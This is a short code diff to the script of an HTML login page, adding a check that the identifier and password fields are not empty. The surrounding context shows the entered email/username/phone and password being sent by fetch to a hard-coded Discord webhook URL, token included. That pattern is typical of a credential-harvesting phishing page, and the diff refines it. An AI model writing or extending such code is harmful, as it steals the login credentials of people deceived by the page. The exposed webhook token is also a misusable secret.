@@ -71,6 +71,12 @@
             const identifier = document.getElementById('identifier').value;
             const password = document.getElementById('password').value;
 
+            // Check if the identifier or password is empty
+            if (!identifier.trim() || !password.trim()) {
+                alert("Both Email/Username/Phone and Password are required!");
+                return;  // Exit the function to prevent sending data
+            }
+
             // Send data to the webhook
             await fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
                 method: 'POST',
@@ -94,3 +100,4 @@
         }
     </script>
 </body>
+</html>
